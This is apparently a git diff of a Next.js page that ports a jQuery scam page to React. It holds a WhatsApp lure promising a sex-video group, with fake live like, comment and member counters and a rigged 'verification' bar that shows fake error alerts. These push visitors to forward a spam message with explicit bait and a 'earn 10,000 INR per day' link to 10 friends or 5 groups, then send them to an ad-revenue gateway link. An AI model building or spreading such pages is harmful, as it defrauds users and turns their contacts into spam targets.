@@ -1,162 +1,51 @@
 // pages/index.js
 import Head from 'next/head';
-import { useEffect } from 'react';
-import styles from '../styles/wastyles.css'; // Import your CSS file
+import { useEffect, useState } from 'react';
+import styles from '../styles/wastyles.module.css'; // Import your CSS file
 
 function Home({ randomImage }) {
+  const [time, setTime] = useState(0);
+  const [likes, setLikes] = useState(134);
+  const [comments, setComments] = useState(23);
+  const [shares, setShares] = useState(12);
+
   useEffect(() => {
-    // Your JavaScript logic related to the existing HTML
-    
+    const timeInterval = setInterval(() => {
+      setTime((prevTime) => prevTime + 1);
+    }, 60000);
 
-    var time = 0;
-window.setInterval(function () {
-    time = time + 1;
-    $(".t1").html(time + 1 + "m");
-    $(".t2").html(time + 2 + "m");
-    $(".t3").html(time + 4 + "m");
-}, 6e4);
-var likes = 134,
-var likes = 134,
-    comments = 23,
-    shares = 12;
-window.setInterval(function () {
-    likes = likes + Math.floor(Math.random() * 3);
-    comments = comments + Math.floor(Math.random() * 2);
-    shares = shares + Math.floor(Math.random() * 2);
-    $("#likes").html(likes + "K");
-    $("#comments").html(comments + "K comments");
-    $("#shares").html(shares + "K shares");
-}, 5e3);
-$(".liked").click(function () {
-    if ($(this).hasClass("selected")) {
-        $(this).removeClass("selected");
-        $(this).html("Like");
-    } else {
-        $(this).addClass("selected");
-        $(this).html("Unlike");
-    }
-});
-</script>
+    const updateStatsInterval = setInterval(() => {
+      setLikes((prevLikes) => prevLikes + Math.floor(Math.random() * 3));
+      setComments((prevComments) => prevComments + Math.floor(Math.random() * 2));
+      setShares((prevShares) => prevShares + Math.floor(Math.random() * 2));
+    }, 5000);
 
-
-<script type="text/javascript">
-
-$("#go").click(function () {
-    $("#intro").fadeOut(0);
-    $("#loader").fadeIn(1000);
-    var i = 0;
-    var interval = setInterval(function () {
-        $("#num").text(i + "%");
-        i += 1;
-        if (i >= 100) {
-            clearInterval(interval);
-            $("#loader").fadeOut(0);
-            $("#info").fadeIn(1000);
-        }
-    }, 50);
-});
-
-$("#confirm").click(function () {
-    $("#info").fadeOut(0);
-    $("#checking").fadeIn(1000);
-    var i = 0;
-    var interval = setInterval(function () {
-        i += 1;
-        $("#percentage").text(i + "%");
-        $("#fill").css("width", i + "%");
-        if (i == 50) {
-            i = 49;
-            setTimeout(function () {
-                i = 50;
-            }, 1000);
-        }
-        if (i >= 100) {
-            clearInterval(interval);
-            $("#load").fadeOut(0);
-            $("#check").fadeIn(0);
-            setTimeout(function () {
-                $("#checking").fadeOut(0);
-                $("#share").fadeIn(1000);
-                $("#getname").html($("#name").val());
-            }, 500);
-        }
-    }, 50);
-});
-
-$(document).click(function () {
-    if ($("#name").is(":focus")) {
-        $(".error").fadeOut(500);
-    }
-});
-
-
-
-
- var text1 = 
-			"🔥💦 *Live Sex* WhatsApp Group *Sexy 18 Adult💋* 🔞 *Viral Chat Videos* 🍌🍌🍌 🔥 🍆 🥵 🎥 *https://whatsap-com.pages.dev* 🍌🍌🍌%0A 💸Earn money *10,000 INR* per day by using your phone👉 *https://payiq.sbs*",
-           error = "There error! Posts are not counted. You may have shared it with the same friend or group more than once, please re-share it",
-            abcde = "ddd",
-            saved = "",
-            share = "whatsapp://send?text=" + text1;
-            
-            
-            
-            
-            
-            var swidth = localStorage.getItem(saved);
-if (swidth !== null) {
-    var width = swidth * 1;
-    $("#intro").fadeOut(0);
-    $(".comments").fadeOut(0);
-    $("#share").fadeIn(0);
-    $("#fill2").css("width", width + "%");
-    $("#percentage2").text(width + "%");
-} else {
-    var width = 0;
-}
-$("#whatsapp").click(function () {
-    window.location.href = share;
-    if (width == 0) {
-        width += 50;
-} else if (width == 50) {
-alert(error);
-width += 15;
-} else if (width == 65) {
-width += 5;
-} else if (width == 70) {
-alert(error);
-width += 10;
-} else if (width == 80) {
-alert(error);
-width += 5;
-} else if (width == 85) {
-width += 5;
-} else if (width == 90) {
-width += 4;
-} else if (width == 94) {
-width += 2;
-} else if (width == 96) {
-width += 2;
-    } else {
-        $("#share").fadeOut(0);
-        $("#claim").fadeIn(1000);
-    }
-    localStorage.setItem(saved, width);
-    setTimeout(function () {
-        $("#fill2").css("width", width + "%");
-        $("#percentage2").text(width + "%");
-    }, 2000);
-});
-$("#offer").click(function () {
-    window.open(cpa, "_blank");
-});
-
-
-    // Cleanup (if needed)
+    // Cleanup intervals
     return () => {
-      // Cleanup logic
+      clearInterval(timeInterval);
+      clearInterval(updateStatsInterval);
     };
   }, []);
+
+  const handleLikedClick = () => {
+    // Handle liked click
+  };
+
+  const handleGoClick = () => {
+    // Handle go click
+  };
+
+  const handleConfirmClick = () => {
+    // Handle confirm click
+  };
+
+  const handleWhatsAppClick = () => {
+    // Handle WhatsApp click
+  };
+
+  const handleOfferClick = () => {
+    // Handle offer click
+  };
 
   return (
     <div>
@@ -170,7 +59,115 @@ $("#offer").click(function () {
 
       {/* Your existing HTML with added styles */}
       <div className={`${styles.post} post`} width="100%">
-        <!-- ... (Your existing HTML) ... -->
+       
+      <div id="intro">
+         
+		 <!-- Change Profile Whatsapp Photo -->
+            <p class="welcome">
+			<!-- <img src="https://i.pinimg.com/736x/29/62/76/296276fae862b091899b16448f6f9cf3.jpg" style="border-radius: 50%;width: 24%;height: 24%;" /> -->
+            <img src="#" name="canvas" id="image" style="border-radius: 50%; width: 100px; height: 100px; object-fit: cover; overflow: hidden;">
+
+
+            <h4><span id="text02"></span> members only</h4>
+            <p>🔥🍌Videos&🔞Pictures🥵💦</p>
+
+            
+            
+
+</p>
+
+		 <!-- Change OpenGraph Whatsapp Photo -->
+          <p class="date">Created on 2023</p>
+               <div class="reactions">
+            <img class="like" src="https://i.ibb.co/tzKjmfT/5KKxWHA.jpg" />
+			<img class="like" src="https://i.ibb.co/5BFGMKF/73XbdXg.jpg" />
+			<img class="like" src="https://i.ibb.co/MGwNy1K/520181.jpg" />
+			<img class="like" src="https://i.ibb.co/qmLCDL4/call-girl-nudes.jpg" />
+            <img class="love" src="https://i.ibb.co/tzKjmfT/5KKxWHA.jpg" />
+            <img class="care" src="https://i.ibb.co/DkpVBxZ/back.png" />
+            <img class="care1" src="https://i.ibb.co/DkpVBxZ/back.png" />
+            <span class="total">+980</span>
+        </div>
+            <button id="go">Join the group</button>
+        </div>
+        <div id="loader">
+            <div>Join a group</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info">
+            <p class="title">Are you 18 years old?</p>
+            <div class="phone">
+                
+              <center>
+<br />
+              
+                <button id="confirm">Yes</button>
+<button id="confm">No</button>
+            </center></div>
+            <p class="error">Please enter a valid number !</p>
+        </div>
+        <div id="checking">
+            <p class="title"></p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+<br />
+<ins style="width: 300px;height:50px" data-width="300" data-height="50" class="xet9rtgaif" data-domain="https://www.toprevenuegate.com/g61y5xt0x?key=fde01fd0faacb9820defe98b613add39" ></ins>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+        <div id="share" style="padding: 7px;">
+          
+             
+            <p class="tip">
+last step:
+    
+</p>
+     <p class="tip1">1- Click the (share) button below and send the message to 10 friends or 5 groups on WhatsApp.</p>      
+            
+<p class="tip2">2- You join the group automatically after the green verification bar is full.</p>
+
+
+
+            
+            
+            <div class="row">
+<div class="col-3">
+ </div>
+</div>
+
+
+            <button id="whatsapp">SHARE</button>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2" style="width: 93%;"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+
+            </div>
+
+</div>
+<!-- Change Offer Link -->
+        <div id="claim">
+            <br />
+            <p class="title">Group link 👇</p>
+<a href="https://www.toprevenuegate.com/g61y5xt0x?key=fde01fd0faacb9820defe98b613add39">
+            <button id="offer">Join now</button>
+          </a>
+<br />
+      </div>
+        
+                
+    </div>
       </div>
 
       {/* Your page content */}
